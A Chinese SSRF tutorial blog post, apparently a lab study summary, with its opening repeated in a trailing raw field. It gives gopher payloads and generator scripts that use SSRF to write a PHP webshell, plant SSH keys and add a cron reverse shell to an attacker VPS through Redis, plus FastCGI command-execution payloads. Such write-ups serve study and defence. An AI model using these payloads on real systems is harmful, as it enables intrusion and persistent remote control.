绝对路径写WebShell\n\n首先构造redis命令：\n\n```\nflushall  \nset 1 '<?php eval($\\_POST\\[\"whoami\"\\]);?>'  \nconfig set dir /var/www/html  \nconfig set dbfilename shell.php  \nsave\n```\n\n然后写一个脚本，将其转化为Gopher协议的格式（脚本时从网上嫖的，谁让我菜呢~~~大佬勿喷）：\n\n```\nimport urllib\nprotocol=\"gopher://\"\nip=\"192.168.52.131\"\nport=\"6379\"\nshell=\"\\\\n\\\\n<?php eval($\\_POST\\[\\\\\"whoami\\\\\"\\]);?>\\\\n\\\\n\"\nfilename=\"shell.php\"\npath=\"/var/www/html\"\npasswd=\"\"\ncmd=\\[\"flushall\",\n\t \"set 1 {}\".format(shell.replace(\" \",\"${IFS}\")),\n\t \"config set dir {}\".format(path),\n\t \"config set dbfilename {}\".format(filename),\n\t \"save\"\n\t \\]\nif passwd:\n\tcmd.insert(0,\"AUTH {}\".format(passwd))\npayload=protocol+ip+\":\"+port+\"/\\_\"\ndef redis\\_format(arr):\n\tCRLF=\"\\\\r\\\\n\"\n\tredis\\_arr = arr.split(\" \")\n\tcmd=\"\"\n\tcmd+=\"\\*\"+str(len(redis\\_arr))\n\tfor x in redis\\_arr:\n\t\tcmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \")\n\tcmd+=CRLF\n\treturn cmd\n\nif \\_\\_name\\_\\_==\"\\_\\_main\\_\\_\":\n\tfor x in cmd:\n\t\tpayload += urllib.quote(redis\\_format(x))\n\tprint payload\n```\n\n执行后生成paylaod如下：\n\n![image-20210113175116867](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202688.jpeg)\n\n这里将生成的payload要进行url二次编码（因为我们发送payload用的是GET方法），然后利用Ubuntu服务器上的SSRF漏洞，将二次编码后的payload打过去就行了：\n\n```\nssrf.php?url=gopher%3A%2F%2F192.168.52.131%3A6379%2F\\_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252435%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524\\_POST%255B%2522whoami%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A\n```\n\n如下所示，成功在主机192.168.52.131上面写入WebShell：\n\n![image-20210113185919592](https://image.3001.net/images/20210114/1610598027_5fffc68b3b060b67168e8.png!small)\n\n### 写SSH公钥\n\n同样，我们也可以直接这个存在Redis未授权的主机的~/.ssh目录下写入SSH公钥，直接实现免密登录，但前提是~/.ssh目录存在，如果不存在我们可以写入计划任务来创建该目录。\n\n构造redis命令：\n\n```\nflushall  \nset 1 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami  \n'  \nconfig set dir /root/.ssh/  \nconfig set dbfilename authorized\\_keys  \nsave\n```\n\n然后编写脚本，将其转化为Gopher协议的格式：\n\n```\nimport urllib\nprotocol=\"gopher://\"\nip=\"192.168.52.131\"\nport=\"6379\"\nssh\\_pub=\"\\\\n\\\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami\\\\n\\\\n\"\nfilename=\"authorized\\_keys\"\npath=\"/root/.ssh/\"\npasswd=\"\"\ncmd=\\[\"flushall\",\n\t \"set 1 {}\".format(ssh\\_pub.replace(\" \",\"${IFS}\")),\n\t \"config set dir {}\".format(path),\n\t \"config set dbfilename {}\".format(filename),\n\t \"save\"\n\t \\]\nif passwd:\n\tcmd.insert(0,\"AUTH {}\".format(passwd))\npayload=protocol+ip+\":\"+port+\"/\\_\"\ndef redis\\_format(arr):\n\tCRLF=\"\\\\r\\\\n\"\n\tredis\\_arr = arr.split(\" \")\n\tcmd=\"\"\n\tcmd+=\"\\*\"+str(len(redis\\_arr))\n\tfor x in redis\\_arr:\n\t\tcmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \")\n\tcmd+=CRLF\n\treturn cmd\n\nif \\_\\_name\\_\\_==\"\\_\\_main\\_\\_\":\n\tfor x in cmd:\n\t\tpayload += urllib.quote(redis\\_format(x))\n\tprint payload\n```\n\n生成的payload同样进行url二次编码，然后利用Ubuntu服务器上的SSRF打过去：\n\n```\nssrf.php?url=gopher%3A%2F%2F192.168.52.131%3A6379%2F\\_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%2524568%250D%250A%250A%250Assh-rsa%2520AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E%2F45IEs%2F9a6AWfXb6iwzo%252BD62y8MOmt%252Bsct27ZxGOcRR95FT6zrfFxqt2h56oLwml%2FTrxy5sExSQ%2FcvvLwUTWb3ntJYyh2eGkQnOf2d%252Bax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH%2F4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd%2FbWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ%2FNnHKyWtI%2FOzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe%252BXqQnjxtk4giopiFfRu8winE9scqlIA5Iu%2Fd3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg%2FOOhoA3iKNhJ%2FJT31TU9E24dGh2Ei8K%252BPpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl%252BSOsVHpNqwFcrgsq%2FWR5BGqnu54vTTdJh0pSrl%252BtniHEnWWU%253D%2520root%2540whoami%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252411%250D%250A%2Froot%2F.ssh%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252415%250D%250Aauthorized\\_keys%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A\n```\n\n如下图，成功在主机192.168.52.131上面写入SSH公钥：\n\n![image-20210113185745287](https://image.3001.net/images/20210114/1610598028_5fffc68c0f8d37e46a560.png!small)\n\n如下图，ssh连接成功：\n\n![image-20210113193746288](https://image.3001.net/images/20210114/1610598029_5fffc68d802a6e5c757d2.png!small)\n\n### 创建计划任务反弹Shell\n\n**注意：这个只能在Centos上使用，别的不行，好像是由于权限的问题。**\n\n构造redis的命令如下：\n\n```\nflushall  \nset 1 '\\\\n\\\\n\\*/1 \\* \\* \\* \\* bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1\\\\n\\\\n'  \nconfig set dir /var/spool/cron/  \nconfig set dbfilename root  \nsave  \n\n// 47.xxx.xxx.72为攻击者vps的IP\n\n然后编写脚本，将其转化为Gopher协议的格式：\n\nimport urllib\nprotocol=\"gopher://\"\nip=\"192.168.52.131\"\nport=\"6379\"\nreverse\\_ip=\"47.xxx.xxx.72\"\nreverse\\_port=\"2333\"\ncron=\"\\\\n\\\\n\\\\n\\\\n\\*/1 \\* \\* \\* \\* bash -i >& /dev/tcp/%s/%s 0>&1\\\\n\\\\n\\\\n\\\\n\"%(reverse\\_ip,reverse\\_port)\nfilename=\"root\"\npath=\"/var/spool/cron\"\npasswd=\"\"\ncmd=\\[\"flushall\",\n\t \"set 1 {}\".format(cron.replace(\" \",\"${IFS}\")),\n\t \"config set dir {}\".format(path),\n\t \"config set dbfilename {}\".format(filename),\n\t \"save\"\n\t \\]\nif passwd:\n\tcmd.insert(0,\"AUTH {}\".format(passwd))\npayload=protocol+ip+\":\"+port+\"/\\_\"\ndef redis\\_format(arr):\n\tCRLF=\"\\\\r\\\\n\"\n\tredis\\_arr = arr.split(\" \")\n\tcmd=\"\"\n\tcmd+=\"\\*\"+str(len(redis\\_arr))\n\tfor x in redis\\_arr:\n\t\tcmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \")\n\tcmd+=CRLF\n\treturn cmd\n\nif \\_\\_name\\_\\_==\"\\_\\_main\\_\\_\":\n\tfor x in cmd:\n\t\tpayload += urllib.quote(redis\\_format(x))\n\tprint payload\n```\n\n生成的payload同样进行url二次编码，然后利用Ubuntu服务器上的SSRF打过去，即可在目标主机192.168.52.131上写入计划任务，等到时间后，攻击者vps上就会获得目标主机的shell：\n\n![image-20210113184927766](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202362.jpeg)\n\n[\\[GKCTF2020\\]EZ三剑客-EzWeb](https://blog.csdn.net/qq_45521281/article/details/106532501)这道题利用的就是攻击内网Redis的思路。\n\n## 攻击内网FastCGI\n\nFastCGI指快速通用网关接口（Fast Common Gateway Interface／FastCGI）是一种让交互程序与Web服务器通信的协议。FastCGI是早期通用网关接口（CGI）的增强版本。FastCGI致力于减少网页服务器与CGI程序之间交互的开销，从而使服务器可以同时处理更多的网页请求。\n\n> 众所周知，在网站分类中存在一种分类就是静态网站和动态网站，两者的区别就是静态网站只需要**通过浏览器进行解析**，而动态网站需要一个**额外的编译解析**的过程。以Apache为例，当访问动态网站的主页时，根据容器的配置文件，它知道这个页面不是静态页面，Web容器就会把这个请求进行简单的处理，然后如果使用的是CGI，就会启动CGI程序（对应的就是PHP解释器）。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程。\n>\n> 这里说的是使用CGI，而FastCGI就相当于高性能的CGI，与CGI不同的是它**像一个常驻的CGI**，在启动后会一直运行着，不需要每次处理数据时都启动一次，**所以FastCGI的主要行为是将CGI解释器进程保持在内存中**，并因此获得较高的性能 。\n\n### php-fpm\n\nFPM（FastCGI 进程管理器）可以说是FastCGI的一个具体实现，用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。\n\n攻击FastCGI的主要原理就是，在设置环境变量实际请求中会出现一个`SCRIPT_FILENAME': '/var/www/html/index.php`这样的键值对，它的意思是php-fpm会执行这个文件，但是这样即使能够控制这个键值对的值，但也只能控制php-fpm去执行某个已经存在的文件，不能够实现一些恶意代码的执行。\n\n而在PHP 5.3.9后来的版本中，PHP增加了安全选项导致只能控制php-fpm执行一些php、php4这样的文件，这也增大了攻击的难度。但是好在PHP允许通过PHP\\_ADMIN\\_VALUE和PHP\\_VALUE去动态修改PHP的设置。\n\n那么当设置PHP环境变量为：`auto_prepend_file = php://input;allow_url_include = On`时，就会在执行PHP脚本之前包含环境变量`auto_prepend_file`所指向的文件内容，`php://input`也就是接收POST的内容，这个我们可以在FastCGI协议的body控制为恶意代码，这样就在理论上实现了php-fpm任意代码执行的攻击。\n\n详情请见：[《SSRF系列之攻击FastCGI》](https://bbs.ichunqiu.com/thread-58455-1-1.html)\n\n测试环境：\n\n![image-20210113225311760](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202250.jpeg)\n\nWEB服务器Ubuntu（192.168.43.166）存在SSRF漏洞：\n\n![image-20210113211319025](https://image.3001.net/images/20210114/1610598034_5fffc69243862a502d80a.png!small)\n\n并且WEB服务器Ubuntu上存在FastCGI，那么我们就可以利用其SSRF漏洞去攻击其本地的FastCGI。\n\n> 假设在配置fpm时，将监听的地址设为了0.0.0.0:9000，那么就会产生php-fpm未授权访问漏洞，此时攻击者可以无需利用SSRF从服务器本地访问的特性，直接与服务器9000端口上的php-fpm进行通信，进而可以用fcgi\\_exp等工具去攻击服务器上的php-fpm实现任意代码执行。\n>\n> 当内网中的其他主机上配置有fpm，且监听的地址为0.0.0.0:9000时，那么这台主机就可能存在php-fpm未授权访问漏洞，我们便可以利用Ubuntu服务器上的SSRF去攻击他，如果内网中的这台主机不存在php-fpm未授权访问漏洞，那么就直接利用Ubuntu服务器上的SSRF去攻击他显然是不行的。\n\n### 使用fcgi\\_exp工具攻击\n\n下载地址：[https://github.com/piaca/fcgi\\_exp](https://github.com/piaca/fcgi_exp)\n\n这个工具主要是用来攻击未授权访问php-fpm的，可用来测试是否可以直接攻击php-fpm，但需要自己将生成的payload进行转换一下。\n\n该工具需要go语言环境，下载后进入目录执行如下命令进行编译：\n\ngo build fcgi\\_exp.go                    # 编译fcgi\\_exp.go\n\n编译完成后，我们在攻击机上使用`nc -lvvp 2333 > fcg_exp.txt`监听2333 端口来接收fcgi\\_exp生成的payload，另外再开启一个终端使用下面的命令来向2333端口发送payload：\n\n./fcgi\\_exp system 127.0.0.1 2333 /var/www/html/index.php \"id\"\n\n![image-20210113205718209](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202135.jpeg)\n\n生成的fcg\\_exp.txt文件的内容是接收到的payload，内容如下：\n\n![image-20210113205857913](https://image.3001.net/images/20210114/1610598036_5fffc694cc3e3da7a21ec.png!small)\n\n然后对fcg\\_exp.txt文件里的payload进行url编码，这里通过如下脚本实现（脚本是我从网上白嫖的嘿嘿）：\n\n\\# -\\*- coding: UTF-8 -\\*-  \nfrom urllib.parse import quote, unquote, urlencode  \n\nfile = open('fcg\\_exp.txt','r')  \npayload = file.read()  \nprint(\"gopher://127.0.0.1:9000/\\_\"+quote(payload).replace(\"%0A\",\"%0D\").replace(\"%2F\",\"/\"))\n\n执行上面的python脚本生成如下payload：\n\n![image-20210113210102251](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202737.jpeg)\n\n这里还要对上面的payload进行二次url编码，然后将最终的payload内容放到?url=后面发送过去：\n\n```\nssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A9000%2F\\_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2514%2504%2500%250F%2510SERVER\\_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE\\_ADDR127.0.0.1%250F%2508SERVER\\_PROTOCOLHTTP%2F1.1%250E%2502CONTENT\\_LENGTH56%250E%2504REQUEST\\_METHODPOST%2509%255BPHP\\_VALUEallow\\_url\\_include%2520%253D%2520On%250Ddisable\\_functions%2520%253D%2520%250Dsafe\\_mode%2520%253D%2520Off%250Dauto\\_prepend\\_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT\\_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT\\_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25008%2500%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----0vcdb34oju09b8fd-----%250D%2527%2529%253B%253F%253E\n```\n\n如下图所示，命令执行成功：\n\n![image-20210113211227610](https://image.3001.net/images/20210114/1610598040_5fffc6982e020c76d98d2.png!small)\n\n### 使用Gopherus工具攻击\n\n下载地址：[https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)\n\n该工具可以帮你生成符合Gopher协议格式的payload，以利用SSRF攻击Redis、FastCGI、MySql等内网应用。\n\n使用Gopherus工具生成攻击FastCGI的payload：\n\npython gopherus.py --exploit fastcgi  \n/var/www/html/index.php    # 这里输入的是一个已知存在的php文件  \nid    # 输入一个你要执行的命令\n\n![image-20201206134630782](https://image.3001.net/images/20210114/1610598041_5fffc69924b889c84f935.png!small)\n\n然后还是将得到的payload进行二次url编码，将最终得到的payload放到?url=后面打过去过去：\n\n```\nssrf.php?url=gopher%3A//127.0.0.1%3A9000/\\_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER\\_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE\\_ADDR127.0.0.1%250F%2508SERVER\\_PROTOCOLHTTP/1.1%250E%2502CONTENT\\_LENGTH54%250E%2504REQUEST\\_METHODPOST%2509KPHP\\_VALUEallow\\_url\\_include%2520%253D%2520On%250Adisable\\_functions%2520%253D%2520%250Aauto\\_prepend\\_file%2520%253D%2520php%253A//input%250F%2517SCRIPT\\_FILENAME/var/www/html/index.php%250D%2501DOCUMENT\\_ROOT/%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500\n```\n\n![image-20210113211649519](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202253.jpeg)\n\n命令执行成功。\n\n## 攻击内网MySql\n\n![20210113152106.png](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202474.jpeg)\n\n首先我们要先了解一下MySql数据库用户认证的过程。MySQL分为服务端和客户端。MySQL数据库用户认证采用的是 挑战/应答 的方式，即服务器生成该挑战码(scramble)并发送给客户端，客户端用挑战码将自己的密码进行加密后，并将相应的加密结果返回给服务器，服务器本地用挑战码的将用户的密码加密，如果加密的结果和用户返回的加密的结果相同则用户认证成功，从而完成用户认证的过程。\n\n登录时需要用服务器发来的挑战码(scramble)将密码加密，但是当数据库用户密码为空时，加密后的密文也为空。客户端给服务端发的认证包就是相对固定的了。这样就无需交互了，可以通过Gopher协议来直接发送了。\n\n测试环境如下：\n\n![image-20210113225607672](https://image.3001.net/images/20210114/1610598044_5fffc69c8db745aea464b.png!small)\n\nUbuntu服务器为WEB服务器，存在SSRF漏洞，且上面运行着MySql服务，用户名为whoami，密码为空并允许空密码登录。\n\n下面我们还是使用Gopherus工具生成攻击Ubuntu服务器本地MySql的payload：\n\npython gopherus.py --exploit mysql  \nwhoami    # 登录用的用户名  \nshow databases;    # 登录后要执行的sql语句\n\n生成如下payload：\n\n![image-20210114004602164](https://image.3001.net/images/20210114/1610598046_5fffc69e8d085bc01c7a3.png!small)\n\n将得到的paylaod进行url二次编码，然后将最终的payload内容放到?url=后面发送打过去就行了。但是我这里失败了，不知道为什么......\n\n## Ending......\n\n推荐一个SSRF练习靶场：\n\n+   ssrf-lab：[https://github.com/fengwenhua/ssrf-lab](https://github.com/fengwenhua/ssrf-lab)\n\n该靶场有一个好看又简洁的界面，提供了最基本的 REST API 和客户端 WebHook 功能用于 SSRF 测试。配置请看：[https://www.heibai.org/post/1287.html](https://www.heibai.org/post/1287.html)\n\n![20210112124413.jpg](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202809.jpeg)\n\n本文多为笔者的学习总结，若有不当的地方还望各位经过的路过的大佬多多点评。\n\n个人博客：[https://whoamianony.top/](https://whoamianony.top/)\n\n> 参考： [https://blog.csdn.net/Ping\\_Pig/article/details/99412487](https://blog.csdn.net/Ping_Pig/article/details/99412487)\n>\n> [https://www.cnblogs.com/iors/p/9777571.html](https://www.cnblogs.com/iors/p/9777571.html)\n>\n> [https://blog.csdn.net/qq\\_43625917/article/details/104528645?utm\\_source=app](https://blog.csdn.net/qq_43625917/article/details/104528645?utm_source=app)\n>\n> [https://xz.aliyun.com/t/2115](https://xz.aliyun.com/t/2115)\n>\n> [https://blog.csdn.net/weixin\\_36343353/article/details/112277580](https://blog.csdn.net/weixin_36343353/article/details/112277580)\n>\n> [https://blog.csdn.net/cj\\_Allen/article/details/106855893](https://blog.csdn.net/cj_Allen/article/details/106855893)\n>\n> [https://www.redteaming.top/2019/07/15/浅析Redis中SSRF的利用/#Redis配合gopher协议进行SSRF](https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/#Redis%E9%85%8D%E5%90%88gopher%E5%8D%8F%E8%AE%AE%E8%BF%9B%E8%A1%8CSSRF)\n>\n> [https://bbs.ichunqiu.com/thread-58455-1-1.html](https://bbs.ichunqiu.com/thread-58455-1-1.html)\n>\n> [https://blog.chaitin.cn/gopher-attack-surfaces/](https://blog.chaitin.cn/gopher-attack-surfaces/)\n>\n> [https://www.anquanke.com/post/id/197431#h2-6](https://www.anquanke.com/post/id/197431#h2-6)\n>\n> [https://www.anquanke.com/post/id/145519#h2-14](https://www.anquanke.com/post/id/145519#h2-14)","source":"_posts/SSRF初探.md","raw":"---\ntitle: SSRF初探\ndate: 2022-05-17 23:41:21\nexcerpt: SSRF初探\ncategories: 学习\n---\n\n\n\n![SSRF](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201984.jpeg)\n\n> FreeBuf停更好久，我都忘了自己还有一个FreeBuf账号了，嘿嘿，你们信吗？\n\n在最近一段时间的CTF中，感觉SSRF的题型又多了起来。SSRF这个漏洞也是我自己最喜欢的一个漏洞了，趁寒假没事干，便写了这篇文章总结一下SSRF的几种利用方式。本文多为笔者的学习总结，内容十分详细且丰富，大佬路过还望多多点评。\n\n## 漏洞详情\n\nSSRF（Server-Side Request Forgery:服务器端请求伪造）是一种由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。正是因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF的攻击目标是攻击者无法直接访问的内网系统。\n\nSSRF漏洞的形成大多是由于服务端提供了从其他服务器应用获取数据的功能而没有对目标地址做过滤和限制。 例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等，利用的就是服务端请求伪造，SSRF漏洞可以利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器。\n\n如下图所示，服务器Ubuntu为WEB服务器，可被攻击者访问，内网中的其他服务器无法被攻击者直接访问。假设服务器Ubuntu中的某个WEB应用存在SSRF漏洞，那我们就可以操作这个WEB服务器去读取本地的文件、探测内网主机存活、探测内网主机端口等，如果借助相关网络协议，我们还可以攻击内网中的Redis、MySql、FastCGI等应用，WEB服务器在整个攻击过程中被作为中间人进行利用。![image-20210112220229389](https://image.3001.net/images/20210114/1610597995_5fffc66bd4875385a330e.png!small)\n\n**容易出现SSRF的地方有：**\n\n> 1.  社交分享功能：获取超链接的标题等内容进行显示\n>\n> 2.  转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览\n>\n> 3.  在线翻译：给网址翻译对应网页的内容\n>\n> 4.  图片加载/下载：例如富文本编辑器中的点击下载图片到本地、通过URL地址加载或下载图片\n>\n> 5.  图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验\n>\n> 6.  云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试\n>\n> 7.  网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作\n>\n> 8.  数据库内置功能：数据库的比如mongodb的copyDatabase函数\n>\n> 9.  邮件系统：比如接收邮件服务器地址\n>\n> 10.  编码处理、属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等\n>\n> 11.  未公开的api实现以及其他扩展调用URL的功能：可以利用google语法加上这些关键字去寻找SSRF漏洞。一些的url中的关键字有：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……\n>\n> 12.  从远程服务器请求资源\n>\n\n**SSRF漏洞的危害：**\n\n> 1.  对外网、服务器所在内网、服务器本地进行端口扫描，获取一些服务的banner信息等。\n>\n> 2.  攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等。\n>\n> 3.  对内网Web应用进行指纹识别，识别企业内部的资产信息。\n>\n> 4.  攻击内外网的Web应用，主要是使用HTTP GET/POST请求就可以实现的攻击，如sql注入、文件上传等。\n>\n> 5.  利用file协议读取服务器本地文件等。\n>\n> 6.  进行跳板攻击等。\n>\n\n## SSRF漏洞相关函数和类\n\n+   file\\_get\\_contents()：将整个文件或一个url所指向的文件读入一个字符串中。\n    \n+   readfile()：输出一个文件的内容。\n    \n+   fsockopen()：打开一个网络连接或者一个Unix 套接字连接。\n    \n+   curl\\_exec()：初始化一个新的会话，返回一个cURL句柄，供curl\\_setopt()，curl\\_exec()和curl\\_close() 函数使用。\n    \n+   fopen()：打开一个文件文件或者 URL。\n    \n+   ......\n    \n\n上述函数函数使用不当会造成SSRF漏洞。 此外，PHP原生类SoapClient在触发反序列化时可导致SSRF。\n\n### file\\_get\\_contents()\n\n测试代码：\n\n```\n// ssrf.php\n<?php\n$url = $\\_GET\\['url'\\];;\necho file\\_get\\_contents($url);\n?>\n```\n\n上述测试代码中，file\\_get\\_contents() 函数将整个文件或一个url所指向的文件读入一个字符串中，并展示给用户，我们构造类似`ssrf.php?url=../../../../../etc/passwd`的paylaod即可读取服务器本地的任意文件。\n\n![image-20210112225820457](https://image.3001.net/images/20210114/1610597996_5fffc66c9d8087b2c3242.png!small)\n\nreadfile()函数与file\\_get\\_contents()函数相似。\n\n### fsockopen()\n\n`fsockopen($hostname,$port,$errno,$errstr,$timeout)`用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。 fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。\n\n测试代码：\n\n```\n// ssrf.php\n<?php\n$host=$\\_GET\\['url'\\];\n$fp = fsockopen($host, 80, $errno, $errstr, 30);\nif (!$fp) {\n    echo \"$errstr ($errno)<br />\\\\n\";\n} else {\n    $out = \"GET / HTTP/1.1\\\\r\\\\n\";\n    $out .= \"Host: $host\\\\r\\\\n\";\n    $out .= \"Connection: Close\\\\r\\\\n\\\\r\\\\n\";\n    fwrite($fp, $out);\n    while (!feof($fp)) {\n        echo fgets($fp, 128);\n    }\n    fclose($fp);\n}\n?>\n```\n\n构造`ssrf.php?url=www.baidu.com`即可成功触发ssrf并返回百度主页：\n\n![image-20210112230552313](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201642.jpeg)\n\n### curl\\_exec()\n\ncurl\\_init(url)函数初始化一个新的会话，返回一个cURL句柄，供curl\\_setopt()，curl\\_exec()和curl\\_close() 函数使用。\n\n测试代码：\n\n```\n// ssrf.php\n<?php \nif (isset($\\_GET\\['url'\\])){\n\t$link = $\\_GET\\['url'\\];\n\t$curlobj = curl\\_init(); // 创建新的 cURL 资源\n\tcurl\\_setopt($curlobj, CURLOPT\\_POST, 0);\n\tcurl\\_setopt($curlobj,CURLOPT\\_URL,$link);\n\tcurl\\_setopt($curlobj, CURLOPT\\_RETURNTRANSFER, 1); // 设置 URL 和相应的选项\n\t$result=curl\\_exec($curlobj); // 抓取 URL 并把它传递给浏览器\n\tcurl\\_close($curlobj); // 关闭 cURL 资源，并且释放系统资源\n```\n\n\n\n\t// $filename = './curled/'.rand().'.txt';\n\t// file\\_put\\_contents($filename, $result); \n\techo $result;\n}\n?>\n\n构造`ssrf.php?url=www.baidu.com`即可成功触发ssrf并返回百度主页：\n\n![image-20210112231108247](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201758.jpeg)\n\n### SoapClient\n\nSOAP是简单对象访问协议，简单对象访问协议（SOAP）是一种轻量的、简单的、基于 XML 的协议，它被设计成在 WEB 上交换结构化的和固化的信息。PHP 的 SoapClient 就是可以基于SOAP协议可专门用来访问 WEB 服务的 PHP 